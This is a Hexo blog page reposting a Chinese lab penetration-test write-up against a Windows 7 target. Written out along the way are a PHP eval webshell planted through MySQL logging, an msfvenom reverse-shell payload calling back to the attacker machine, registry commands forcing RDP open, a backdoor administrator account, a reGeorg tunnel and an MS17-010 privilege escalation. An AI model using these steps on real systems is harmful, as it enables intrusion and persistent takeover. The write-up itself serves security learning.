@@ -1,0 +1,669 @@
+<!DOCTYPE html>
+<html lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no">
+<meta name="author" content="obsem">
+
+
+
+<meta name="description" content="注：本文转载自先知社区 原文链接：https://xz.aliyun.com/t/8523 实验环境：win7靶机：192.168.42.128">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次简单的渗透练习">
+<meta property="og:url" content="http://yoursite.com/2020/11/19/记一次简单的渗透练习/index.html">
+<meta property="og:site_name" content="obsetear">
+<meta property="og:description" content="注：本文转载自先知社区 原文链接：https://xz.aliyun.com/t/8523 实验环境：win7靶机：192.168.42.128">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184516-7b7aba9e-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184527-81ff0ce4-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184547-8ddbb526-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184555-92a54ab8-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184606-998164ac-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184614-9df42ca4-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184631-a8211250-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184634-a9f8e666-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184636-ab5c6c62-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184656-b7572cfa-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184702-badaa640-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184712-c09e61c0-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184721-c5d2ae94-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184727-c97c99f6-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184733-ccf89cc4-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184737-cfa41084-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184746-d4d2d48c-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184803-df2d9688-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184808-e20a1142-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184817-e73184d4-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184827-ed8f3d8a-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184855-fe416266-2666-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185040-3c4ebb62-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185050-42a3a612-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185110-4eb9f208-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185130-5a39a4de-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185135-5d3d23c2-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185146-640254de-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185156-69dfed76-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185212-7371bfcc-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185224-7a4c49ac-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185250-8a03dda6-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185257-8e143076-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185304-9270b95a-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185311-96729b9a-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185337-a640a6fc-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185344-aa3b090a-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185401-b4785d78-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185419-bf595cc4-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185428-c4b21ef4-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185435-c8633ca4-2667-1.jpeg">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114185441-cc88fcf6-2667-1.jpeg">
+<meta property="og:updated_time" content="2021-02-08T07:43:49.586Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="记一次简单的渗透练习">
+<meta name="twitter:description" content="注：本文转载自先知社区 原文链接：https://xz.aliyun.com/t/8523 实验环境：win7靶机：192.168.42.128">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20201114184516-7b7aba9e-2666-1.jpeg">
+
+<link rel="apple-touch-icon" href="/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="obsetear" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>记一次简单的渗透练习 | obsetear</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: true,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: false
+    }
+</script>
+
+
+    <script> yiliaConfig.jquery_ui = [false]; </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head></html>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/2.jpg" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">obsem</a></h1>
+        </hgroup>
+
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="/tags/">标签云</a></li>
+                        
+                            <li><a href="/about/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">专注于前端</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">obsem</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/2.jpg" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">obsem</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="/tags/">标签云</a></li>
+                
+                    <li><a href="/about/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa Email" target="_blank" href="mailto:123@123.com" title="Email"></a>
+                            
+                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
+                            
+                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-记一次简单的渗透练习" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/11/19/记一次简单的渗透练习/" class="article-date">
+      <time datetime="2020-11-18T16:00:00.000Z" itemprop="datePublished">2020-11-19</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      记一次简单的渗透练习
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <p><strong>注：本文转载自先知社区</strong></p>
+<p>原文链接：<a href="https://xz.aliyun.com/t/8523" target="_blank" rel="noopener">https://xz.aliyun.com/t/8523</a></p>
+<p><strong>实验环境：</strong><br>win7靶机：192.168.42.128</p>
+<a id="more"></a>
+
+<p>攻击机kali2020：192.168.42.129</p>
+<h2 id="0x01、信息收集"><a href="#0x01、信息收集" class="headerlink" title="0x01、信息收集"></a>0x01、信息收集</h2><p>Nmap扫描开放的端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Namp -sV 192.168.42.128</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184516-7b7aba9e-2666-1.jpeg" alt="1.jpg"></p>
+<p>继续对80端口进行信息收集</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184527-81ff0ce4-2666-1.jpeg" alt="2.jpg"></p>
+<p>发现了phpinfo.php文件和phpMyAdmin</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184547-8ddbb526-2666-1.jpeg" alt="3.jpg"></p>
+<p>访问phpinfo.php发现www根目录的位置</p>
+<p>访问phpmyadmin，使用弱口令root,root成功进入后台</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184555-92a54ab8-2666-1.jpeg" alt="4.jpg"></p>
+<p>这里可以看到mysql的版本和apache服务器的一些信息</p>
+<h2 id="0x02、利用phpmyadmin日志文件getshell"><a href="#0x02、利用phpmyadmin日志文件getshell" class="headerlink" title="0x02、利用phpmyadmin日志文件getshell"></a>0x02、利用phpmyadmin日志文件getshell</h2><p>执行<code>SHOW VARIABLES LIKE &#39;secure_file_priv&#39;</code>查看该站点是否有写入权限</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184606-998164ac-2666-1.jpeg" alt="5.jpg"></p>
+<p>secure_file_priv的值为null，说明mysql不允许导入导出</p>
+<p>执行 <code>SHOW VARIABLES LIKE &#39;%general_log%&#39;</code>查看日志文件的相关信息</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184614-9df42ca4-2666-1.jpeg" alt="6.jpg"></p>
+<p>可以看到日志为关闭状态，我们需要开启日志，并且更换日志路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SET GLOBAL general_log = &apos;ON&apos;;  </span><br><span class="line">SET GLOBAL general_log_file = &apos;C:/phpStudy/WWW/log.php&apos;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184631-a8211250-2666-1.jpeg" alt="7.jpg"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184634-a9f8e666-2666-1.jpeg" alt="8.jpg"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184636-ab5c6c62-2666-1.jpeg" alt="9.jpg"></p>
+<p>执行SQL语句，写入一句话木马</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &apos;&lt;?php @eval($_POST[&quot;obse&quot;]);?&gt;&apos;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184656-b7572cfa-2666-1.jpeg" alt="10.jpg"></p>
+<p>查看木马是否可用</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184702-badaa640-2666-1.jpeg" alt="11.jpg"></p>
+<h2 id="0x03、利用Yxcms来getshell"><a href="#0x03、利用Yxcms来getshell" class="headerlink" title="0x03、利用Yxcms来getshell"></a>0x03、利用Yxcms来getshell</h2><p>目标机上存在已知cms</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184712-c09e61c0-2666-1.jpeg" alt="12.jpg"></p>
+<p>进入后台登录界面</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184721-c5d2ae94-2666-1.jpeg" alt="13.jpg"></p>
+<p>利用phpmyadmin查看admin密码</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184727-c97c99f6-2666-1.jpeg" alt="14.jpg"></p>
+<p>尝试对密码进行md5解密</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184733-ccf89cc4-2666-1.jpeg" alt="15.jpg"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184737-cfa41084-2666-1.jpeg" alt="16.jpg"></p>
+<p>解密失败，看来不一定是md5加密</p>
+<p>百度得到yxcms后台默认管理员密码123456，然后进入后台</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184746-d4d2d48c-2666-1.jpeg" alt="17.jpg"></p>
+<p>通过前台模板插入木马文件</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184803-df2d9688-2666-1.jpeg" alt="18.jpg"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184808-e20a1142-2666-1.jpeg" alt="19.jpg"></p>
+<p>注意木马文件所在位置</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184817-e73184d4-2666-1.jpeg" alt="20.jpg"></p>
+<p>yxcms下有protected和public两个目录，经过一番寻找，最终发现木马位置</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184827-ed8f3d8a-2666-1.jpeg" alt="21.jpg"></p>
+<h2 id="0x04、getshell后的一些操作"><a href="#0x04、getshell后的一些操作" class="headerlink" title="0x04、getshell后的一些操作"></a>0x04、getshell后的一些操作</h2><p>用蚁剑连上shell</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114184855-fe416266-2666-1.jpeg" alt="22.jpg"></p>
+<p>蚁剑的虚拟终端不是很好用，个人还是比较喜欢用msf中的会话</p>
+<p>用msf生成exe木马，创建一个终端会话，php马也可以，不过我这里我这里不知道是什么原因，php马总是掉</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.42.129 LPORT=4444 -e x86/shikata_ ga_nai -i 5 -f exe &gt; 123.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185040-3c4ebb62-2667-1.jpeg" alt="23.jpg"></p>
+<p><strong>尝试用终端强行开启3389端口，然后使用远程桌面连接</strong></p>
+<p>进入shell后，为了防止乱码，再输入<code>chcp 65001</code> 来更改编码方式</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185050-42a3a612-2667-1.jpeg" alt="24.jpg"></p>
+<p>查看3389端口是否开启</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185110-4eb9f208-2667-1.jpeg" alt="25.jpg"></p>
+<p>可以看到3389端口未开启</p>
+<p>强行开启3389端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">echo Windows Registry Editor Version 5.00&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server]&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">echo &quot;fDenyTSConnections&quot;=dword:00000000&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp]&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">echo [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDPTcp]&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">echo &quot;PortNumber&quot;=dword:00000d3d&gt;&gt;3389.reg</span><br><span class="line"></span><br><span class="line">regedit /s 3389.reg</span><br><span class="line"></span><br><span class="line">del 3389.reg</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185130-5a39a4de-2667-1.jpeg" alt="26.jpg"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185135-5d3d23c2-2667-1.jpeg" alt="27.jpg"></p>
+<p>命令行添加windows用户并加入administrators组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net user obse Password@007 /add</span><br><span class="line"></span><br><span class="line">net localgroup administrators obse /add</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185146-640254de-2667-1.jpeg" alt="28.jpg"></p>
+<p>尝试远程桌面连接</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185156-69dfed76-2667-1.jpeg" alt="29.jpg"></p>
+<p>应该是设置了什么策略，所以我们没法成功连接</p>
+<p>如果是真实的渗透，建议使用代理工具代理流量，这里随便记录一下使用reGeorg开启socks5反向代理的方法</p>
+<p>先上传tunnel.php到与shell.php同一目录下</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185212-7371bfcc-2667-1.jpeg" alt="30.jpg"></p>
+<p>访问tunnel.php如果出现以下界面则说明这个脚本可用</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185224-7a4c49ac-2667-1.jpeg" alt="31.jpg"></p>
+<p>运行reGeorgSocksProxy.py脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 reGeorgSocksProxy.py -l 0.0.0.0 -p 2333 -u http://192.168.42.128/yxcms/protected/apps/default/view/default/tunnel.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185250-8a03dda6-2667-1.jpeg" alt="32.jpg"></p>
+<p>这时就可以使用代理软件了，使用proxifier进行socks5代理</p>
+<p>打开proxifier，在配置文件中选择代理服务器</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185257-8e143076-2667-1.jpeg" alt="33.jpg"></p>
+<p>然后在配置文件中选择代理规则</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185304-9270b95a-2667-1.jpeg" alt="34.jpg"></p>
+<p>这里应用程序本来是任意程序，这里只需要添加mstsc.exe(远程桌面连接程序)</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185311-96729b9a-2667-1.jpeg" alt="35.jpg"></p>
+<p>最后只勾选我们需要的代理就行了</p>
+<p>然后再进行远程桌面连接就可以了</p>
+<p><strong>尝试提权</strong></p>
+<p>既然没法远程桌面连接，那就尝试提权吧</p>
+<p>使用bypassuac进行提权</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185337-a640a6fc-2667-1.jpeg" alt="36.jpg"></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185344-aa3b090a-2667-1.jpeg" alt="37.jpg"></p>
+<p>经过一番尝试，未能提权成功</p>
+<p>使用系统漏洞提权</p>
+<p>复制systeminfo信息到提权辅助页面：<code>https://bugs.hacking8.com/tiquan/</code></p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185401-b4785d78-2667-1.jpeg" alt="38.jpg"></p>
+<p>查询到以下漏洞</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185419-bf595cc4-2667-1.jpeg" alt="39.jpg"></p>
+<p>search漏洞编号，利用漏洞提权</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185428-c4b21ef4-2667-1.jpeg" alt="40.jpg"></p>
+<p>ms17-010可以利用</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185435-c8633ca4-2667-1.jpeg" alt="41.jpg"></p>
+<p>设置好参数，然后执行脚本</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20201114185441-cc88fcf6-2667-1.jpeg" alt="42.jpg"></p>
+<p>成功提权到system</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2020/11/19/记一次简单的渗透练习/">记一次简单的渗透练习</a></p>
+        <p><span>文章作者:</span><a href="/" title="回到主页">obsem</a></p>
+        <p><span>发布时间:</span>2020-11-19, 00:00:00</p>
+        <p><span>最后更新:</span>2021-02-08, 15:43:49</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2020/11/19/记一次简单的渗透练习/" title="记一次简单的渗透练习">http://yoursite.com/2020/11/19/记一次简单的渗透练习/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2020/11/19/记一次简单的渗透练习/　　作者: obsem" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2020/11/21/从文件上传到浅谈.htaccess文件的作用/">
+                    从文件上传到浅谈.htaccess文件的作用
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2020/10/10/python 正则表达式小结（笔记）/">
+                    python正则表达式小结（笔记）
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01、信息收集"><span class="toc-number">1.</span> <span class="toc-text">0x01、信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02、利用phpmyadmin日志文件getshell"><span class="toc-number">2.</span> <span class="toc-text">0x02、利用phpmyadmin日志文件getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03、利用Yxcms来getshell"><span class="toc-number">3.</span> <span class="toc-text">0x03、利用Yxcms来getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04、getshell后的一些操作"><span class="toc-number">4.</span> <span class="toc-text">0x04、getshell后的一些操作</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"记一次简单的渗透练习　| obsetear　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2020/11/21/从文件上传到浅谈.htaccess文件的作用/" title="上一篇: 从文件上传到浅谈.htaccess文件的作用">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
